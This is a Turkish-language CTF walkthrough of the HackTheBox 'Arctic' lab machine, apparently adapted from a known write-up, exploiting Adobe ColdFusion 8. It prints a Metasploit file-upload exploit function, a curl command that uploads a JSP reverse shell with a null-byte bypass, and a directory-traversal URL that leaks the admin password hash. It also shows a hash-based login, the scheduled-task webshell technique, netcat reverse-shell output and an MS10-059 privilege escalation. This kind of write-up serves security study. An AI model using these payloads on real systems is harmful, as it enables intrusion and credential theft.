---
{"dg-publish":true,"permalink":"/ctf/arctic-ctf/"}
---

**Arctic**, her HTTP isteğinde yaşanan 30 saniyelik gecikme olmasaydı çok daha ilginç olabilirdi. Yine de, **ColdFusion webserver**'ı bulmam için yeterli bir arayüz var.

**Shell** elde etmek için iki farklı yol mevcut:

1. **Unauthenticated file upload** yoluyla dosya yüklemek.
2. **Login hash**'ini sızdırıp **crack etmek** veya doğrudan giriş yapmak, ardından **JSP shell** yüklemek.

Bundan sonra, **MS10-059** exploit'ini kullanarak **root shell** alacağım.


## Box Info

|Name|[Arctic](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Farctic)[![Arctic](https://0xdf.gitlab.io/icons/box-arctic.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Farctic)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Farctic)|
|---|---|
|Release Date|22 Mar 2017|
|Retire Date|26 May 2017|
|OS|Windows ![Windows](https://0xdf.gitlab.io/icons/Windows.png)|
|Base Points|Easy [20]|
|Rated Difficulty|![Rated difficulty for Arctic](https://0xdf.gitlab.io/img/arctic-diff.png)|
|Radar Graph|![Radar chart for Arctic](https://0xdf.gitlab.io/img/arctic-radar.png)|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|14 days + 23:57:59[![adxn37](https://www.hackthebox.com/badge/image/32)](https://app.hackthebox.com/users/32)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|15 days + 03:55:12[![adxn37](https://www.hackthebox.com/badge/image/32)](https://app.hackthebox.com/users/32)|
|Creator|[![ch4p](https://www.hackthebox.com/badge/image/1)](https://app.hackthebox.com/users/1)|

## Recon

### nmap

nmap üç açık TCP portu buldu, RPC (135, 49154) ve (8500) üzerinde bir şey:

![Pasted image 20250209190616.png](/img/user/resimler/Pasted%20image%2020250209190616.png)

![Pasted image 20250209190904.png](/img/user/resimler/Pasted%20image%2020250209190904.png)

### Website - TCP 8500

#### Protocol Enumeration

Porta bağlanmak için nc kullandım ve bana herhangi bir hata mesajı göndermesini sağlamaya çalıştım:

![Pasted image 20250209191137.png](/img/user/resimler/Pasted%20image%2020250209191137.png)

#### Site

Tıpkı nc'de olduğu gibi, bu sunucuya yapılan her isteğin çözülmesi yaklaşık 30 saniye sürüyor, bu da acı verici. Web root bir dizin listesi verir:

![Pasted image 20250209191209.png](/img/user/resimler/Pasted%20image%2020250209191209.png)


**CFIDE** ve **cfdocs**, **ColdFusion** hipotezine uyuyor.

Her ikisini de yeni sekmelerde açacağım ve başka şeyleri de yeni sekmelerde açmaya başlayacağım. Ancak, çok fazla sekme açmak hepsinin **boş yanıtlar döndürmesine** neden olabileceğinden dikkatli olmalıyım.

**Son derece yavaş bir server** ve **dizinlerin listeleniyor gibi görünmesi** nedeniyle, şimdilik **brute force** yapmayı erteleyeceğim.


#### /CFIDE/administrator

Sekmeleri açmak ve sayfaların yüklenmesini beklemek için biraz zaman harcadıktan sonra, en ilginç şey ColdFusion versiyon 8 için bir giriş sayfası sunan /CFIDE/administrator oldu:

![Pasted image 20250209191507.png](/img/user/resimler/Pasted%20image%2020250209191507.png)

Kullanıcı adını değiştirmeme izin vermiyor, ancak 'admin' ve 'arctic' gibi birkaç şifre tahmininde bulundum. İkisi de işe yaramadı ama POST isteğinde bir tuhaflık vardı. Örneğin, 'admin' şifresi için POST aşağıda verilmiştir:

```
POST /CFIDE/administrator/enter.cfm HTTP/1.1
Host: 10.10.10.11:8500
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.11:8500/CFIDE/administrator/
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Connection: close
Cookie: CFID=100; CFTOKEN=20430451
Upgrade-Insecure-Requests: 1

cfadminPassword=B9BC23617C8434AB7A7E01BC1AA55D774366202E&requestedURL=%2FCFIDE%2Fadministrator%2Findex.cfm%3F&salt=1589482492739&submit=Login
```

Sayfa kaynağına baktığımda, HTML form öğesinin hangi verilerin gönderileceğini tanımladığını görebiliyorum

```
<form name="loginform" action="/CFIDE/administrator/enter.cfm" method="POST" onSubmit="cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value));" >
```

Formun ilerleyen kısımlarında salt, sayfada gizli bir değer olarak yer alır:

```
<input name="requestedURL" type="hidden" value="/CFIDE/administrator/enter.cfm?">
<input name="salt" type="hidden" value="1589483602821">
<input name="submit" type="submit" value="Login" style=" margin:7px 0px 0px 2px;;width:80px">
```

Yani giriş formunu talep ettiğimde, sunucu bir salt oluşturuyor ve bunu sayfaya gönderiyor. Sonra formu gönderdiğimde, bu salt değerini alır ve Javascript kullanarak SHA1 hash ve ardından HMAC SHA1 hash sonuçlarını alır ve gönderir.

#### Vulnerabilities

searchsploit ColdFusion için bir sürü şey döndürür:

![Pasted image 20250209192059.png](/img/user/resimler/Pasted%20image%2020250209192059.png)
![Pasted image 20250209192113.png](/img/user/resimler/Pasted%20image%2020250209192113.png)

Her bir sonuca bakmak için birkaç dakika ayırmaya değer. Birçoğunu sürüm uyuşmazlığı nedeniyle veya bu noktada XSS hatalarıyla gerçekten ilgilenmediğim için göz ardı edebilirim. Geriye bunlar kalıyor:

```
Adobe ColdFusion - Directory Traversal                                                                  | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                     | multiple/remote/16985.rb
Adobe ColdFusion 2018 - Arbitrary File Upload                                                           | multiple/webapps/45979.txt
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                               | multiple/remote/24946.rb
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                       | cfm/webapps/16788.rb
Macromedia ColdFusion MX 6.1 - Template Handling Privilege Escalation   
```

**Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)** exploit'ini biraz daha incelediğimde, farklı bir **ColdFusion** versiyonu için olduğunu gördüm.

Ayrıca, **Adobe ColdFusion 2018 - Arbitrary File Upload** exploit'ini de eleyebilirim çünkü **/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm** yoluna **POST isteği göndermeye** dayanıyor ve **Arctic** üzerinde **cf_scripts** dizinini bulamadım.

Geriye daha ayrıntılı incelemem gereken iki **vulnerability** kalıyor.

## Shell as tolis

### Generate Payload

**Webserver'a dosya yükleme zafiyetlerinde**, genellikle önce **CFM webshell** kullanarak bir **foothold** elde eder ve ardından **shell** alırım. Ancak, bu makine inanılmaz derecede **yavaş**, bu yüzden **ColdFusion**'dan olabildiğince hızlı kurtulmak istiyorum.

**JSP payload'ları** genellikle **ColdFusion** üzerinde çalıştığı için, **msfvenom** ile bir tane oluşturacağım:

![Pasted image 20250209192506.png](/img/user/resimler/Pasted%20image%2020250209192506.png)


### Path 1: Unauthenticated RCE

#### Exploit Analysis

Arctic üzerinde RCE'ye giden en doğrudan yol Execution güvenlik açığıdır:

```
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit) | cfm/webapps/16788.rb
```

Özellikle **OSCP pratiği** için, bir **Metasploit script'ini** okuyup anlamak kritik bir beceridir.

Bu yüzden, **searchsploit -x cfm/webapps/16788.rb** komutuyla script'i açacağım.

En ilginç kısım ise **exploit** fonksiyonu:

```
def exploit

    page  = rand_text_alpha_upper(rand(10) + 1) + ".jsp"

    dbl = Rex::MIME::Message.new
    dbl.add_part(payload.encoded, "application/x-java-archive", nil, "form-data; name=\"newfile\"; filename=\"#{rand_text_alpha_upper(8)}.txt\"")
    file = dbl.to_s
    file.strip!

    print_status("Sending our POST request...")

    res = send_request_cgi(
        {
            'uri'           => "#{datastore['FCKEDITOR_DIR']}",
            'query'         => "Command=FileUpload&Type=File&CurrentFolder=/#{page}%00",
            'version'       => '1.1',
            'method'        => 'POST',
            'ctype'         => 'multipart/form-data; boundary=' + dbl.bound,
            'data'          => file,
            }, 5)

    if ( res and res.code == 200 and res.body =~ /OnUploadCompleted/ )
        print_status("Upload succeeded! Executing payload...")

        send_request_raw(
            {
                # default path in Adobe ColdFusion 8.0.1.
                'uri'           => '/userfiles/file/' + page,
                'method'        => 'GET',
                }, 5)

        handler
    else
        print_error("Upload Failed...")
        return
    end

end
```

Bu, **nispeten basit bir exploit**—yalnızca iki **HTTP isteği** gönderiyor.

İlk olarak, **FCKEDITOR_DIR**'e bir **POST isteği** yapıyor. Bu dizin, script'in önceki bölümünde **varsayılan olarak** `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm` olarak tanımlanmış.

Ardından, **payload'ı tetiklemek** için **/userfiles/file/** yoluna bir **GET isteği** gönderiyor.

#### Upload Reverse Shell

Bu exploit'i curl ile yeniden oluşturabilirim:

![Pasted image 20250209192803.png](/img/user/resimler/Pasted%20image%2020250209192803.png)

Bu işlem tamamlandığında, root'ta yeni bir klasör oluşur:

![Pasted image 20250209192818.png](/img/user/resimler/Pasted%20image%2020250209192818.png)

Ancak, **/userfiles/file/** içinde herhangi bir dosya yok. Muhtemelen bir **filter** tarafından engellendim.

![Pasted image 20250209193115.png](/img/user/resimler/Pasted%20image%2020250209193115.png)


Gönderdiğim **request** şu şekilde görünüyor:


```
POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00 HTTP/1.1
Host: 10.10.10.11:8500
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 1700
Content-Type: multipart/form-data; boundary=------------------------2cf8346e8d23a757
Expect: 100-continue
Connection: close

--------------------------2cf8346e8d23a757
Content-Disposition: form-data; name="newfile"; filename="shell.jsp"
Content-Type: application/octet-stream

<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
...[snip]...
```

Bu **upload** işlemini çalıştırmak için ayarlamam gereken iki şey var ve her ikisi de **MSF exploit'inde** tanımlı.

İlk olarak, **dosya adı** **.jsp** ile bitmemeli, çünkü bu filtreleniyor. **MSF script'i**, **.txt** uzantısını kullanıyor, bu yüzden **payload'ımın bir kopyasını** `shell.txt` olarak oluşturacağım.

Ayrıca, **MSF script'i**, dosyanın **Content-Type** değerini **application/x-java-archive** olarak ayarlıyor.

**curl komutumu güncelleyeceğim**. **-F** argümanında **header'ları form datası içinde** `;` ile ayırarak ayarlayabilirim:

```
curl -X POST -F "newfile=@shell.jsp;type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00'
```

Şimdi /userfiles/file/ adresini ziyaret ettiğinizde yüklenen shell'i görebilirsiniz:

![Pasted image 20250209193410.png](/img/user/resimler/Pasted%20image%2020250209193410.png)


#### Execute Shell

Bu url'yi curl ile ziyaret edebilirim:

![Pasted image 20250209193550.png](/img/user/resimler/Pasted%20image%2020250209193550.png)

![Pasted image 20250209193613.png](/img/user/resimler/Pasted%20image%2020250209193613.png)

Oradan user.txt dosyasını alabilirim:

### Path 2: Leak Hash, Upload JSP

#### Directory Traversal / Password Hash Leak

Searchsploit'ten alınan bu iki sonuç bir directory traversal güvenlik açığını göstermektedir:

```
Adobe ColdFusion - Directory Traversal                                                                  | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                     | multiple/remote/16985.rb
```


Python script'ini incelediğimde, **GET isteğini** şu adrese gönderdiğini görüyorum:

```
http://server/CFIDE/administrator/enter.cfm
```

Bu istekte, **locale** parametresi kullanılarak **birkaç dizin yukarı çıkılıyor** ve belirli bir dosyaya erişilmeye çalışılıyor. İstek, `%00en` ile sona eriyor.

Muhtemelen site, **locale** parametresinin belirli bir string ile bitmesini zorunlu kılıyor. Ancak, exploit **null byte (%00)** kullanarak bu kontrolü atlatıyor ve yine de hedef dosyaya erişiyor.

Örnekteki dosya özellikle dikkat çekici çünkü **password.properties** dosyası. Bu dosyayı almak için şu URL'yi ziyaret edeceğim:

```
http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

![Pasted image 20250209194459.png](/img/user/resimler/Pasted%20image%2020250209194459.png)

Bu parola alanı bir hash gibi görünüyor ve uzunluğu göz önüne alındığında SHA1 gibi görünüyor: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03.

![Pasted image 20250209194539.png](/img/user/resimler/Pasted%20image%2020250209194539.png)

#### Log In

Parola alanına **happyday** yazdığımda başarılı bir şekilde giriş yapabildim.

Peki, kullanıcı **kırılması zor** bir parola seçmiş olsaydı ve bunu kolayca **brute force** yapamasaydım? Aslında burada bunu da aşmanın bir yolu var.

Daha önce gördüğümüz gibi, **JavaScript**, parola girişini (**happyday**) alıp önce **SHA1 hash'ini** oluşturuyor, ardından **HMAC hash** ile birleştiriyor ve **salt (veya key)** ile birlikte siteye gönderiyor.

https://nets.ec/Coldfusion_hacking#Logging_In

Bu yüzden, sitede yapılan işlemi **lokalde taklit edebilirim**. **Leaked hash** sayesinde bunu doğrudan kendim hesaplayabilirim.

Bunun için **Firefox Developer Tools**'a girerek, sayfadaki aynı **JavaScript fonksiyonlarını** kullanarak gönderilen **hash**'i oluşturacağım.

Sayfadaki **salt** değerine erişmek için şu kodu çalıştırabilirim:

```
document.loginform.salt.value
```

Ardından, **SHA1 hash**'i kullanarak gönderilen değeri hesaplayacağım.

```
hex_hmac_sha1(document.loginform.salt.value, '2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03');
```

Bir sonuç verir:

![Pasted image 20250209194708.png](/img/user/resimler/Pasted%20image%2020250209194708.png)

Formu göndereceğim ve hesaplamalara göre hash'i değiştireceğim:

```
POST /CFIDE/administrator/enter.cfm HTTP/1.1
Host: 10.10.10.11:8500
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.11:8500/CFIDE/administrator/
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Connection: close
Cookie: CFID=100; CFTOKEN=20430451; CFADMIN_LASTPAGE_ADMIN=%2FCFIDE%2Fadministrator%2Fhomepage%2Ecfm
Upgrade-Insecure-Requests: 1

cfadminPassword=C1F159600F4058D19D25DACA563D723273798E8C&requestedURL=%2FCFIDE%2Fadministrator%2Findex.cfm%3F&salt=1589487103545&submit=Login
```

Giriş başarılı! Ancak burada dikkat edilmesi gereken bir nokta var.

**Burp** üzerinden trafiği izlediğimde, **login ekranında beklerken** formun yaklaşık **her 30 saniyede bir yenilendiğini** görüyorum. Bu yenileme ile birlikte **yeni bir salt** oluşturuluyor.

Eğer gönderdiğim **hash'in salt değeri**, sunucudaki güncel **salt** ile eşleşmezse, giriş reddediliyor. Bu yüzden **işlemi hızlı bir şekilde yapmam gerekiyor**.

Bunu **otomatikleştirmek** zor değil. **Python** veya **TamperMonkey script'i** ile **daha hızlı yanıt veren bir uygulamada** manuel işlem yapmak yerine süreci otomatize edebilirim.

#### Upload Reverse Shell

Arctic'e bir shell yazmak için [burada](https://nets.ec/Coldfusion_hacking#Writing_Shell_to_File) özetlenen adımları takip edeceğim. İlk olarak Server Settings altında Mappings'e gidin ve CFIDE için C:\ColdFusion8\wwwroot\CFIDE yolunu bulun:

![Pasted image 20250209195420.png](/img/user/resimler/Pasted%20image%2020250209195420.png)

Şimdi ana **admin sayfasına** geri dönüp, **Debugging & Logging** > **Scheduled Tasks** kısmına gideceğim:

![Pasted image 20250209195438.png](/img/user/resimler/Pasted%20image%2020250209195438.png)

**Schedule New Task**'a tıklayacağım ve aşağıdaki bilgileri vereceğim:

**Task Name:** İstediğim herhangi bir isim  
**URL:** CFM shell almak için kontrol ettiğim URL. Meğerse **Kali**'de **/usr/share/webshells/cfm** dizininde bir **CFM webshell** varmış. Bu dizinde bir **Python webserver** başlattım.  
**Publish:** "Save output to a file" kutusunu işaretleyeceğim.  
**File:** **Mappings** sekmesinden aldığım yolu, shell'in ismini ve `.cfm` uzantısını ekleyeceğim.

![Pasted image 20250209195521.png](/img/user/resimler/Pasted%20image%2020250209195521.png)

**Submit**'e tıkladığımda, görev görünüyor ve ardından **yeşil daireli** belgeye tıklayarak **görevi şimdi çalıştırabiliyorum**.

![Pasted image 20250209195541.png](/img/user/resimler/Pasted%20image%2020250209195541.png)

Web sunucumda bir bağlantı var:

```
root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.11 - - [13/May/2020 08:46:34] "GET /cfexec.cfm HTTP/1.1" 200 -
```

Şimdi http://10.10.10.11:8500/CFIDE/ adresini yenilediğimde shell'i görüyorum:

![Pasted image 20250209195612.png](/img/user/resimler/Pasted%20image%2020250209195612.png)

#### Execute Shell

.jsp'ye tıklandığında nc listener'ımda bir shell dönüyor:

```
root@kali# rlwrap nc -nvlp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.11.
Ncat: Connection from 10.10.10.11:49774.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
arctic\tolis

```

user.txt dosyasını buradan da alabilirim.


## Priv: tolis –> system

### Enumeration

Dosya sistemini inceledim ve **ColdFusion** dışında pek ilginç bir şey görmedim. **systeminfo** komutunu çalıştırdığımda, bunun **Windows 2008 R2** bir sunucu olduğunu ve üzerine herhangi bir **hotfix** uygulanmadığını gördüm.

```
C:\>systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 
System Boot Time:          14/5/2020, 9:38:49 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 261 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.199 MB
Virtual Memory: In Use:    848 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```


### Windows-Exploit-Suggester

**Hotfix**'lerin tamamen eksik olması, bu sistemin bir **exploit**'e karşı savunmasız olabileceğini gösteriyor.

**sysinfo** sonuçlarını kullanarak [**Windows Exploit Suggester**](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)'ı çalıştırabilirim. **Repo'yu** `/opt` dizinine **klonlayacağım**.

```
root@kali:/opt# git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git         
Cloning into 'Windows-Exploit-Suggester'...          
remote: Enumerating objects: 120, done.
remote: Total 120 (delta 0), reused 0 (delta 0), pack-reused 120
Receiving objects: 100% (120/120), 169.26 KiB | 6.27 MiB/s, done.
Resolving deltas: 100% (72/72), done. 
```

Ayrıca Python xlrd kütüphanesini python -m pip install xlrd ile yüklemem gerekecek.

İlk olarak bir veritabanı oluşturacağım:

![Pasted image 20250209200508.png](/img/user/resimler/Pasted%20image%2020250209200508.png)

Şimdi bunu sysinfo çıktısına karşı çalıştırabilirim:

Kütüphane eksik 

![Pasted image 20250209200652.png](/img/user/resimler/Pasted%20image%2020250209200652.png)

![Pasted image 20250209201636.png](/img/user/resimler/Pasted%20image%2020250209201636.png)

sysinfo dosyasını kopyalayıp python script'ine girdi olarak veriyoruz.

```
python2 windows-exploit-suggester.py --database 2025-02-09-mssb.xls --systeminfo sysinfo 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical

```

Bunlara baktığımda, MSF modüllerine başlamak konusunda çok ilgim olmadığından ve IE (Internet Explorer)'nin kullanıcı etkileşimi gerektireceği düşünüldüğünde, incelemem gerekenler şunlardır:

- MS10-047
- MS10-059
- MS10-061
- MS10-073
- MS11-011
- MS13-005


### MS10-059

Exploit kodu için biraz araştırma yaparken, [egre55](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri)'in GitHub'ında MS10-059 için bir exploit buldum. Özellikle bu **binary** dosyanın bağlanmak için bir IP ve port gerektirmesi ilgimi çekti. Çoğu exploit, yeni bir cmd başlatarak SYSTEM olarak çalıştırır ki bu, bilgisayarın başında olduğunuzda güzel bir şeydir, ancak remote bir shell üzerinden o kadar kullanışlı değildir.

**Binary** dosyayı indirdim (internet üzerinden doğrudan indirilen .exe dosyalarını çalıştırmak her zaman iyi bir fikir olmasa da, bir CTF ortamı için bunu çalıştırmaya hazırım) ve mevcut dizinimi paylaşmak için `smbserver.py share .` komutunu çalıştırdım.

Sonra shell’imde, dosyayı Arctic’e kopyaladım:

![Pasted image 20250209202212.png](/img/user/resimler/Pasted%20image%2020250209202212.png)

![Pasted image 20250209202310.png](/img/user/resimler/Pasted%20image%2020250209202310.png)

![Pasted image 20250209202735.png](/img/user/resimler/Pasted%20image%2020250209202735.png)

Şimdi bir nc listener başlatıyorum ve çalıştırıyorum:

![Pasted image 20250209202823.png](/img/user/resimler/Pasted%20image%2020250209202823.png)

![Pasted image 20250209202836.png](/img/user/resimler/Pasted%20image%2020250209202836.png)

![Pasted image 20250209202906.png](/img/user/resimler/Pasted%20image%2020250209202906.png)
